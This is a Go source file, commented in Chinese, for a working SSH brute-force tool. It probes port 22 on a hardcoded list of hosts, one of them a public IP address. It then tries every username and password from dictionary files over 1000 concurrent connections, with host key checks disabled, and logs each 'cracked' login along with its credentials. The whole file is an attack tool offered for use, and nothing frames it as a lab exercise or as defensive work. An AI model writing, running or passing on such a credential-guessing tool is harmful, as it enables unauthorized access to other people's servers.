package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

//22端口存活性
func checkAlive(ip string) bool {
	alive := false
	_, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, "22"), time.Second*1)
	if err == nil {
		alive = true
	}
	return alive
}

//读取字典文件
func readDictFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	var result []string
	for scanner.Scan() {
		passwd := strings.TrimSpace(scanner.Text())
		if passwd != "" {
			result = append(result, passwd)
		}
	}
	return result, err
}

//ssh登录,使用官方包
func sshLogin(ip, username, password string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{ //ssh的配置
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         2 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config) //尝试连接
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		errRet := session.Run("echo hello !!")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}

//并发
type Task struct {
	ip       string
	user     string
	password string
}

func runTask(tasks []Task, threads int) {
	var wg sync.WaitGroup
	taskCh := make(chan Task, threads*2)
	for i := 0; i < threads; i++ { //并发数量,消费者
		go func() {
			for task := range taskCh { //获取任务
				success, _ := sshLogin(task.ip, task.user, task.password)
				if success {
					log.Printf("破解%v成功，用户名是%v,密码是%v\n", task.ip, task.user, task.password)
				}
				wg.Done()
			}
		}()
	}

	for _, task := range tasks { //生产者
		wg.Add(1)
		taskCh <- task
	}
	wg.Wait()
	close(taskCh)
}

func main() {
	//带破解的主机列表
	ips := []string{"10.0.0.1", "124.223.174.63", "10.0.0.8"}
	//主机是否存活检查
	var aliveIps []string
	for _, ip := range ips {
		if checkAlive(ip) {
			aliveIps = append(aliveIps, ip)
		}
	}
	//读取弱口令字典
	users, err := readDictFile("username.txt")
	if err != nil {
		log.Fatalln("读取用户名字典文件错误：", err)
	}
	passwords, err := readDictFile("password.txt")
	if err != nil {
		log.Fatalln("读取密码字典文件错误：", err)
	}

	var t []Task
	for _, user := range users {
		for _, password := range passwords {
			for _, ip := range aliveIps {
				t = append(t, Task{ip: ip, user: user, password: password})
			}
		}
	}

	runTask(t, 1000)

}
